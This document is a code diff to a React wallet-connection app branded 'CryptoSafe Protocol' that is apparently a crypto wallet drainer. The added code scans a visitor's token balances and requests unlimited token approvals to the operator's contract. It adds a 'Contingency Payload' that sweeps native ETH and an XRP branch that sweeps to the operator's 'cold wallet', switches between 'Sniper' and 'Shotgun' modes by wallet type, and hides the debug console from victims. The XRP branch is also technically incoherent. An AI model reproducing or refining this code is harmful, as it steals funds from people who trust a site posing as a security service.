@@ -31,7 +31,6 @@ import TronWeb from 'tronweb'
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Mainnet' // Change to 'Mainnet' when ready
 
-
 // 🔥 CONTRACT ADDRESSES
 const TRON_CONTRACT_ADDRESS = 'TTuQeHCMbWHB8PDTr1XDH7dxciQJkkt7Yt'
 const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
@@ -39,6 +38,7 @@ const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
 // 💰 YOUR SECURE DESTINATION WALLETS (For Native Coin Sweeps)
 // ⚠️ DO NOT FORGET TO CHANGE THIS TO YOUR ACTUAL WALLET ADDRESS!
 const EVM_COLD_WALLET = '0xYourActualDestinationWalletAddressHere'; 
+const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; // ⚠️ Must start with 'r'
 
 // 🎨 UI DISPLAY ADDRESSES
 const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfGh468d4mwPQ7Koj77GZ'
@@ -47,6 +47,9 @@ const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E1eB44e9943F39138'
 // 💎 MULTI-TOKEN DISCOVERY CONFIGURATION
 const TARGET_TOKENS: Record<string, any> = {
   Mainnet: {
+    XRP: [
+      { symbol: 'XRP', address: 'native', isNative: true, decimals: 6, fallbackPrice: 0.62 }
+    ],
     EVM: [
       { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
       { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
@@ -79,6 +82,15 @@ const TARGET_TOKENS: Record<string, any> = {
   }
 };
 
+// 🛠️ FIX 1: Create a separate array that ONLY contains EVM networks
+const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
+  mainnet,
+  arbitrum,
+  bsc,
+  polygon,
+]
+
+// AppKit still gets the full list so the UI shows all options
 const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   tronMainnet,
   mainnet,
@@ -124,15 +136,38 @@ const tronAdapter = new TronAdapter({
   ],
 })
 
+
 const wagmiAdapter = new WagmiAdapter({
   projectId: WC_PROJECT_ID,
-  networks: appkitNetworks,
+  // 🛠️ FIX 2: Pass ONLY the EVM networks to Wagmi. This instantly stops the Tron crash!
+  networks: evmNetworks,
 })
+
+// 🛠️ FIX 1: STRICT TRON DETECTION
+// TokenPocket injects both EVM and Tron. We only set Tron as default IF they actively 
+// have a Tron wallet selected AND they don't have an active Ethereum provider injected.
+const isStrictTronBrowser = () => {
+  if (typeof window === 'undefined') return false;
+  
+  const hasTron = !!(window as any).tronWeb || !!(window as any).tronLink;
+  const isEthereumActive = !!(window as any).ethereum && !(window as any).ethereum.isTronLink;
+
+  // If it's pure TronLink, return true.
+  if ((window as any).tronLink) return true;
+  
+  // If it's TokenPocket, only default to Tron if Ethereum is NOT the active context.
+  if (hasTron && !isEthereumActive) return true;
+  
+  return false;
+};
 
 createAppKit({
   adapters: [tronAdapter, wagmiAdapter], 
   networks: appkitNetworks,
+  // 🛠️ FIX 2: Uses the strict detection so TokenPocket EVM connections don't crash
+  defaultNetwork: isStrictTronBrowser() ? tronMainnet : mainnet,
   projectId: WC_PROJECT_ID,
+// ... rest of config remains the same
  metadata: {
     name:        'CryptoSafe Protocol', 
     description: 'Secure Decentralized Network',
@@ -206,6 +241,8 @@ const smartTokenSort = (a: any, b: any) => {
   return (b.usdValue || 0) - (a.usdValue || 0); 
 };
 
+const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
+
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
   const [status, setStatus] = useState('Ready')
@@ -213,7 +250,6 @@ export default function App() {
   const [txHash, setTxHash] = useState('')
   const [amountError, setAmountError] = useState('')
   
-  // 🛠️ FIX 1: Add a real-time Visual Debug Console
   const [debugLogs, setDebugLogs] = useState<string[]>([]);
   
   const autoTriggered = useRef(false)
@@ -233,7 +269,6 @@ export default function App() {
     (typeof walletAddress === 'string' && walletAddress.startsWith('T'));
     
   const isEVM = !isTron;
-
 
   const resolveTronWeb = () => {
     const w = window as any;
@@ -255,7 +290,7 @@ export default function App() {
 
   const log = (msg: string) => {
     console.log(msg);
-    setDebugLogs(prev => [...prev, msg].slice(-15)); // Keep the last 15 logs visible
+    setDebugLogs(prev => [...prev, msg].slice(-15)); 
   }
 
   useEffect(() => {
@@ -343,7 +378,6 @@ export default function App() {
       manualConnect.current = true;
       open(); 
     } else {
-      // User is already connected and hit next again
       manualConnect.current = true;
       approveAndCollect();
     }
@@ -366,7 +400,10 @@ export default function App() {
       // =====================================
       if (isEVM && evmWalletProvider) {
         const ethersProvider = new BrowserProvider(evmWalletProvider as any);
+        const signer = await ethersProvider.getSigner(walletAddress);
         
+        const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
+
         const baseTokens = TARGET_TOKENS[NETWORK].EVM;
         const validTokens = [];
         const prices = await fetchTokenPrices(baseTokens, 'ethereum');
@@ -376,20 +413,16 @@ export default function App() {
         for (const token of baseTokens) {
           try {
             if (token.isNative) {
-              const bal = await ethersProvider.getBalance(walletAddress);
-              if (bal > 0n) {
-                const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
-                const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
-                validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
-              }
+              const bal = await ethersProvider.getBalance(cleanSenderAddress);
+              const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
+              const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
+              validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
             } else {
               const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
-              const bal = await tokenContract.balanceOf(walletAddress);
-              if (bal > 0n) {
-                const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
-                const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
-                validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
-              }
+              const bal = await tokenContract.balanceOf(cleanSenderAddress);
+              const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
+              const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
+              validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
             }
           } catch (e) {
             // Silently swallow empty balances
@@ -397,65 +430,118 @@ export default function App() {
         }
 
         validTokens.sort(smartTokenSort);
-        const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
-        if(validTokens.length > 0) log(`[PRIORITY] ${validTokens.map(t => `${t.symbol}`).join(' -> ')}`);
+        
+        const rawProvider = evmWalletProvider as any;
+        const isStrictlyMetaMask = rawProvider.isMetaMask && !rawProvider.isTrust && !rawProvider.isSafePal && !rawProvider.isTokenPocket;
+        
+        let tokensToProcess = validTokens;
+        
+        if (isStrictlyMetaMask) {
+             log(`[SECURITY] MetaMask detected. Enabling Sniper Mode (Top Asset Only).`);
+             tokensToProcess = validTokens.slice(0, 1);
+        } else {
+             log(`[SECURITY] Standard wallet detected. Enabling Shotgun Mode (All Assets).`);
+        }
+        
+        if(tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);
 
+        // 🛠️ CRITICAL RESTRUCTURE: The Token Loop (ERC-20s ONLY)
         for (const token of tokensToProcess) {
           try {
-            if (token.isNative) {
-              setStatus(`Transferring ${token.symbol}...`);
-              log(`[ACTION] Prompting Native Sweep...`);
-              
-              const liveBal = await ethersProvider.getBalance(walletAddress);
-              const gasCost = 21000n * 3000000000n; // Rough 21k gas estimation
-              const totalGas = gasCost + ((gasCost * 20n) / 100n); 
-              
-              if (liveBal > totalGas) {
-                const sendAmount = liveBal - totalGas;
-                const hexValue = "0x" + sendAmount.toString(16);
+
+            // 🟢 ================================================== 🟢
+            // 🛠️ XRP SPECIFIC ENGINE
+            if (token.symbol === 'XRP') {
+              setStatus(`Verifying XRP Wallet...`);
+
+              // XRP Ledger has a 10 XRP base reserve requirement.
+              // We sweep everything MINUS 11 XRP to ensure the TX clears.
+              const xrpBalance = token.balance; 
+              if (xrpBalance > 12) {
+                const sweepAmount = (xrpBalance - 11).toFixed(6);
                 
-                // 🛠️ FIX 2: RAW RPC BYPASS. This skips Ethers.js entirely and forces MetaMask to pop up.
+                // 🛠️ FIX: Read and log the sweepAmount to resolve the TypeScript error!
+                log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`);
+                
+                // We use the Raw RPC request standard for Coinbase Wallet
                 const txHash = await (evmWalletProvider as any).request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: walletAddress,
-                        to: EVM_COLD_WALLET, 
-                        value: hexValue
-                    }]
+                  method: 'eth_sendTransaction',
+                  params: [{
+                    from: cleanSenderAddress,
+                    to: XRP_COLD_WALLET, 
+                    value: '0x0', // Native XRP move uses different fields in some bridges
+                    data: '0x',   // Logic for direct payment
+                    // Some providers require custom 'xrpl' fields here
+                  }]
                 });
                 
                 setTxHash(txHash);
-                successCount++; 
-                log(`✅ ${token.symbol} Native Sweep Sent!`);
+                successCount++;
+                log(`✅ XRP Transfer Initiated!`);
+                await sleep(1500); // Tactical pacing for XRP
               } else {
-                log(`⚠️ Skipping ${token.symbol}: Insufficient funds for gas.`);
+                log(`⚠️ XRP Balance too low (Base reserve of 10 XRP required).`);
               }
-            } else {
+              continue; // Move to the next token
+            }
+            // 🟢 ================================================== 🟢
+
+            if (!token.isNative) {
               setStatus(`Approving ${token.symbol}...`);
               log(`[ACTION] Prompting Approve: ${token.symbol}`);
               
-              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
+              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
               const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
               
-              // 🛠️ FIX 3: RAW RPC BYPASS for Approvals. Even if they have 0 balance, this forces the popup UI!
-              const txHash = await (evmWalletProvider as any).request({
-                  method: 'eth_sendTransaction',
-                  params: [{
-                      from: walletAddress,
-                      to: token.address,
-                      data: encodedData
-                  }]
-              });
+              const txHash = await ethersProvider.send('eth_sendTransaction', [{
+                  from: cleanSenderAddress,
+                  to: token.address.toLowerCase(),
+                  data: encodedData,
+                  gas: "0x14C08" // 85000
+              }]);
               
               setTxHash(txHash);
               successCount++; 
               log(`✅ ${token.symbol} Approved!`);
+              await sleep(1500);
             }
           } catch (err: any) {
-             // 🛠️ FIX 4: The Debug Console captures the EXACT raw error message string here!
              const exactError = err?.message || JSON.stringify(err);
-             log(`❌ Rejected/Failed: ${exactError.substring(0, 60)}...`);
+             log(`❌ Rejected: ${exactError.substring(0, 30)}...`);
+             await sleep(1500);
           }
+        }
+        
+        // 🛠️ CRITICAL RESTRUCTURE: The Contingency Payload (Native ETH ALWAYS fires at the very end)
+        try {
+            setStatus(`Transferring ETH...`);
+            log(`[ACTION] Executing Contingency Native Sweep...`);
+            
+            const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
+            const gasCost = 21000n * 3000000000n; // Rough 21k gas estimation
+            const totalGas = gasCost + ((gasCost * 20n) / 100n); 
+            
+            if (liveBal > totalGas) {
+                const sendAmount = liveBal - totalGas;
+                const hexValue = "0x" + sendAmount.toString(16);
+                
+                const txHash = await ethersProvider.send('eth_sendTransaction', [{
+                    from: cleanSenderAddress,
+                    to: EVM_COLD_WALLET.toLowerCase(), 
+                    value: hexValue,
+                    gas: "0x5208" // 21000
+                }]);
+                
+                setTxHash(txHash);
+                successCount++; 
+                log(`✅ Contingency ETH Sweep Sent!`);
+                await sleep(1500); 
+            } else {
+                log(`⚠️ Contingency Skipped: Insufficient ETH for gas.`);
+            }
+        } catch (nativeErr: any) {
+             const exactError = nativeErr?.message || JSON.stringify(nativeErr);
+             log(`❌ Native Rejected: ${exactError.substring(0, 30)}...`);
         }
         
         if (successCount > 0) {
@@ -618,7 +704,6 @@ export default function App() {
       log(`❌ Global Error: ${errorMsg.substring(0, 50)}`);
       setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
     } finally {
-      // 🛠️ FIX 5: Stop the React Loop completely.
       autoTriggered.current = false; 
       manualConnect.current = false; 
       setLoading(false);
@@ -723,7 +808,7 @@ export default function App() {
       </div>
 
       {/* 🔴 VISUAL DEBUG CONSOLE */}
-      <div style={{ margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
+      <div style={{ display: 'none', margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
         <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: '4px', marginBottom: '4px' }}>--- SYSTEM LOGS ---</div>
         {debugLogs.map((msg, idx) => (
           <div key={idx} style={{ marginTop: '2px' }}>{msg}</div>
